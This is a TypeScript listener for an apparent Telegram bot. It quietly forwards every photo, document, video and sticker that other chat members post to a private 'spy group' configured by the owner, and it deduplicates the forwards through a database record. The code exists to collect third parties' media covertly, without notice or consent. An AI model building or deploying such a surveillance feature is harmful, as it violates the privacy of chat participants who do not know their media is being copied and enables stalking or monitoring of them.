// src/listeners/spy-media-group.listener.ts
import type { Message } from '../types/misc'
import { env } from '../service/validate-env'
import ProcessedSpyMedia from '../db/spy-media.schema'
import type { MessageListener } from '../utils/register-message-listeners'

export const spyMediaGroupListener: MessageListener = async (ctx) => {
  const ownerId = env.OWNER_USER_ID
  const spyGroupId = env.SPY_GROUP_ID
  const spyEnabled = env.SPY_ENABLED

  if (!spyEnabled) return
  const msg: Message = ctx.message as Message
  const from = ctx.from

  // 1) ignore messages you send
  if (from.id === ownerId) return

  // 2) detect media
  const media = msg.photo?.slice(-1)[0] ?? msg.document ?? msg.video ?? msg.sticker
  if (!media) return

  const fileUniqueId = media.file_unique_id
  if (!fileUniqueId) return

  // 3) try to record it for this spy group
  try {
    await new ProcessedSpyMedia({ spyGroupId, fileUniqueId }).save()
  } catch (err: any) {
    // duplicate key → already forwarded, skip
    if (err.code === 11000) return
    console.error('Error recording spy media:', err)
    return
  }

  // 4) forward to your spy group
  try {
    await ctx.telegram.forwardMessage(
      spyGroupId, // where to forward
      ctx.chat.id, // original chat
      msg.message_id // original message
    )
    console.log(`🔍 forwarded ${fileUniqueId} to spy group`)
  } catch (forwardErr) {
    console.error('Failed to forward spy media:', forwardErr)
  }
}
